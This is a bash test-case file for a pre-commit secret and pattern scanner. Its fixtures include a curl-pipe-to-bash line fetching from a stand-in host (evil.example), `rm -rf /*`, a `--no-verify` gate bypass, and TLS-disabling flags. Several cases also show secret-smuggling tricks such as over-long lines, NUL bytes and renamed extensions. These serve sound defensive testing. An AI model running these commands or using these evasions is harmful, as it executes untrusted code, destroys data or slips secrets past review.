# shellcheck shell=bash
# cases/04-shell-config-rename.sh — shell-pattern detection (23–28),
# config-validation (29–31), and rename-bypass defenses (32–35).
# Sourced into the driver's shell.

# 23. Broadened curl|bash — the common `curl -fsSL <url> | bash` form (split).  # scaffold-allow: test fixture
echo "cur""l -fsSL https://evil.example/i.sh | bash" >deploy2.sh
git add deploy2.sh
assert_rejects "curl -fsSL <url> | bash detected" "Piping remote download"  # scaffold-allow: test fixture

# 24. Broadened rm -rf — the catastrophic `rm -rf /*` form ('' splits the glob).
echo "rm -rf /""*" >danger.sh
git add danger.sh
assert_rejects "rm -rf /* detected" "refuse to ship"  # scaffold-allow: test fixture

# 25. NEGATIVE: a scoped removal must NOT be flagged (false-positive guard).
echo "rm -rf /tmp/build-cache" >cleanup.sh
git add cleanup.sh
assert_passes "scoped rm -rf /tmp/... is not flagged"

# 25b. `git ... --no-verify` is rejected — it bypasses the pre-commit/commit-msg
#      gate. Consumed by agent-precheck (Claude/Cursor) at the action boundary;
#      this scans the committed shell file too. `gi`+`t` split so this harness
#      file carries no live pattern in the new fixture line.
echo "gi""t commit -m 'wip' --no-verify" >skip.sh
git add skip.sh
assert_rejects "git --no-verify is rejected" "bypasses the pre-commit"

# 25c. NEGATIVE: a non-git `--no-verify` flag (e.g. an installer) must NOT match —
#      the rule is scoped to a git subcommand within one pipeline segment.
echo "./install.sh --no-verify --both" >setup.sh
git add setup.sh
assert_passes "non-git --no-verify (installer flag) is not flagged"

# 25d. `curl -k`/`--insecure` disables TLS cert validation (shell.txt). shell.txt
#       scopes to .sh/.bash, so this harness file is itself scanned — `cur`+`k`
#       split keeps the live pattern off the script line; the temp repo fixture
#       reassembles it. (`-k` is the short insecure flag.)
echo "cur""l -k https://example.com/x" >insecure-curl.sh
git add insecure-curl.sh
assert_rejects "curl -k is rejected" "TLS cert validation"  # scaffold-allow: test fixture

# 25e. `wget --no-check-certificate` — same TLS-disable bug class (shell.txt).
#       `wge`+`t` split so this .sh harness line carries no live pattern.
echo "wge""t --no-check-certificate https://example.com/x" >insecure-wget.sh
git add insecure-wget.sh
assert_rejects "wget --no-check-certificate is rejected" "TLS cert validation"  # scaffold-allow: test fixture

# 26. NEGATIVE: pattern scan is case-SENSITIVE — `Console.log` (capital C) is a
#     different identifier and must pass, not be flagged as `console.log`.
echo 'Console.log("ok");' >comp.ts
git add comp.ts
assert_passes "case-sensitive: Console.log not flagged as console.log"

# 27. Deleting the secrets config in the same commit must not silently disable
#     the scanner — the hook refuses a staged deletion of .forbidden-patterns/*.txt.
git rm -q .forbidden-patterns/secrets.txt
assert_rejects "deleting forbidden-pattern config is refused" "disabling the scanner"

# 28. scaffold-allow only exempts when it follows a comment leader; the bare
#     substring inside a string literal must NOT whitelist a real secret.
echo 'note = "scaffold-allow AKIA''IOSFODNN7EXAMPLE"' >sneaky2.txt
git add sneaky2.txt
assert_rejects "scaffold-allow in a string does not exempt a secret" "AWS access key"

# 28b. REGRESSION (scaffold-allow `--` smuggle): the bare `--` leader used to
#      exempt ANY line in ANY language. `--` is not a comment in JS, yet a marker
#      placed inside a string literal — `"<secret> -- scaffold-allow"` — got the
#      whole line dropped from the findings. Dropping `--` as a leader closes it.
#      AKIA split so this harness file carries no live key; the temp-repo .js
#      fixture reassembles the key + marker on one line.
printf 'const k = "%s -- scaffold-allow";\n' "AKIA""IOSFODNN7EXAMPLE" >smuggle.js
git add smuggle.js
assert_rejects "bare -- scaffold-allow does not exempt a secret" "AWS access key"

# 29. A config line with no TAB separator is skipped with a warning (not promoted
#     to a whole-line pattern); a valid pattern on another line still scans.
printf 'this line has no tab separator at all\n' >>.forbidden-patterns/backend.txt
echo 'pri''nt("debug")' >hastab.py
git add .forbidden-patterns/backend.txt hastab.py
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ missing-TAB config — accepted, expected reject (print should still scan)"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
elif grep -qF "no TAB separator" "$HOOK_OUT"; then
  echo "  ✓ missing-TAB config line skipped with warning, valid pattern still scans"
  PASS=$((PASS + 1))
else
  echo "  ✗ missing-TAB config — rejected but no warning emitted"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 30. CI mode fails CLOSED when secrets.txt is absent (it would otherwise pass
#     silently — disabling the scanner). Exercises the --ci code path directly.
rm -f .forbidden-patterns/secrets.txt
if printf '' | .githooks/lib/check-secrets --ci >"$HOOK_OUT" 2>&1; then
  echo "  ✗ --ci absent-config — exited 0, expected fail-closed"
  FAIL=$((FAIL + 1))
elif grep -qF "secret scanner is disabled" "$HOOK_OUT"; then
  echo "  ✓ --ci fails closed when secrets.txt is missing"
  PASS=$((PASS + 1))
else
  echo "  ✗ --ci absent-config — failed without the expected message"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 31. ReDoS guard now FAILS CLOSED. A line over MAX_LINE_LENGTH is still dropped
#     before the combined ERE (so it can't hang superlinearly), but check-secrets
#     no longer lets that file pass silently — an unscannable line is reported
#     and the commit is rejected. The old behavior (warn + exit 0) was a
#     fail-OPEN hole: a secret on a >50k line rode straight through. A secret on
#     a normal line is still caught too.
{
  echo "AKIA""IOSFODNN7EXAMPLE"
  head -c 60000 /dev/zero | tr '\0' a
  echo
} >redos.txt
git add redos.txt
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ ReDoS guard — accepted, expected reject (over-long line is unscannable)"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
elif grep -qF "AWS access key" "$HOOK_OUT" && grep -qF "cannot be scanned for secrets" "$HOOK_OUT"; then
  echo "  ✓ over-long line fails closed; secret on normal line still caught"
  PASS=$((PASS + 1))
else
  echo "  ✗ ReDoS guard — rejected but missing the secret hit or the fail-closed message"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 31b. The bypass that motivated the fail-closed change: a secret embedded IN a
#      single >MAX_LINE_LENGTH line. The old scanner dropped the whole line (and
#      the secret with it) and exited 0; now the unscannable line is reported and
#      the commit is rejected. AKIA literal split so this harness file is clean.
{ head -c 60000 /dev/zero | tr '\0' a; printf ' AKIA''IOSFODNN7EXAMPLE\n'; } >longsecret.txt
git add longsecret.txt
assert_rejects "secret hidden on a >MAX_LINE_LENGTH line no longer slips through" "cannot be scanned for secrets"

# 32. Rename bypass: a secret-bearing TEXT file given a binary extension is
#     still scanned. Binary is decided by CONTENT (a NUL byte), not by the name,
#     so .png/.zip/etc. no longer smuggle a plaintext secret past the scan.
echo "AKIA""IOSFODNN7EXAMPLE" >logo.png
git add logo.png
assert_rejects "secret renamed to .png is still scanned" "AWS access key"

# 33. Same rename bypass via a lockfile name the old extension list skipped.
echo "AKIA""IOSFODNN7EXAMPLE" >package-lock.json
git add package-lock.json
assert_rejects "secret in package-lock.json is still scanned" "AWS access key"

# 34. Defense in depth: a secret in a file with BOTH a binary extension AND a
#     NUL byte is still caught. We skip nothing by name, and a NUL never marks a
#     blob "binary, skip" (that would reopen the NUL-byte bypass) — so combining
#     the two evasions still fails. \000 writes the NUL; AKIA literal split.
printf 'AKIA''IOSFODNN7EXAMPLE\000trailing\n' >payload.png
git add payload.png
assert_rejects "secret with NUL + binary extension is still scanned" "AWS access key"

# 35. --ci annotation escaping: a filename containing ':' and ',' is
#     percent-encoded in the ::error property (%3A / %2C) so a crafted name
#     can't forge or truncate the annotation. Exercises the --ci path directly.
echo "AKIA""IOSFODNN7EXAMPLE" >'weird:name,x.txt'
git add 'weird:name,x.txt'
printf '%s\0' 'weird:name,x.txt' | .githooks/lib/check-secrets --ci >"$HOOK_OUT" 2>&1 || true
if grep -qF 'file=weird%3Aname%2Cx.txt' "$HOOK_OUT"; then
  echo "  ✓ --ci ::error escapes : and , in the filename property"
  PASS=$((PASS + 1))
else
  echo "  ✗ --ci ::error escaping — expected percent-encoded filename, got:"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 36. check-filenames is CASE-INSENSITIVE. macOS/Windows filesystems (which the
#     project explicitly targets — see the case-collision hygiene check) treat
#     `cert.PEM`, `.ENV`, `ID_RSA` as the same files as their lowercase forms, so
#     an uppercase/mixed-case credential filename must still be blocked. Each
#     fixture's CONTENT is benign, so only the filename rule can fire (isolating
#     this from check-secrets).
echo "placeholder" >cert.PEM
git add -f cert.PEM
assert_rejects "uppercase .PEM filename is blocked (case-insensitive)" "PEM file"

printf 'FOO=bar\n' >.ENV
git add -f .ENV
assert_rejects "uppercase .ENV filename is blocked (case-insensitive)" "environment file"

echo "placeholder" >ID_RSA
git add -f ID_RSA
assert_rejects "uppercase ID_RSA filename is blocked (case-insensitive)" "SSH private key"

# 36b. NEGATIVE: the .env.example allowlist still holds regardless of case —
#      a shared-config template must NOT be blocked.
printf 'FOO=bar\n' >.ENV.EXAMPLE
git add -f .ENV.EXAMPLE
assert_passes ".ENV.EXAMPLE (allowlisted template) is not blocked"

# 36c. A10 regression — the LOWERCASE canonical forms (the dominant real-world
#      spelling) and EVERY alternative in the SSH-key case line need their own
#      coverage. The #36 fixtures are all UPPERCASE, so they exercise the case-
#      fold but leave the base globs `*.pem` / `id_rsa` and the untested SSH
#      alternatives (id_ed25519 / id_ecdsa / id_dsa) unguarded — a typo in any of
#      them would let a private key through with the suite green. Benign content
#      keeps each fixture isolated to the filename rule.
echo "placeholder" >key.pem
git add -f key.pem
assert_rejects "lowercase key.pem is blocked (PEM base glob)" "PEM file"

echo "placeholder" >id_rsa
git add -f id_rsa
assert_rejects "lowercase id_rsa is blocked (SSH key)" "SSH private key"

echo "placeholder" >id_ed25519
git add -f id_ed25519
assert_rejects "id_ed25519 is blocked (SSH key alternative)" "SSH private key"

echo "placeholder" >id_ecdsa
git add -f id_ecdsa
assert_rejects "id_ecdsa is blocked (SSH key alternative)" "SSH private key"

echo "placeholder" >id_dsa
git add -f id_dsa
assert_rejects "id_dsa is blocked (SSH key alternative)" "SSH private key"

# 36d. NEGATIVE — the remaining .env allowlist entries (.env.sample/.env.template;
#      only .env.example was covered) must NOT be blocked.
printf 'FOO=bar\n' >.env.sample
git add -f .env.sample
assert_passes ".env.sample (allowlisted template) is not blocked"

printf 'FOO=bar\n' >.env.template
git add -f .env.template
assert_passes ".env.template (allowlisted template) is not blocked"
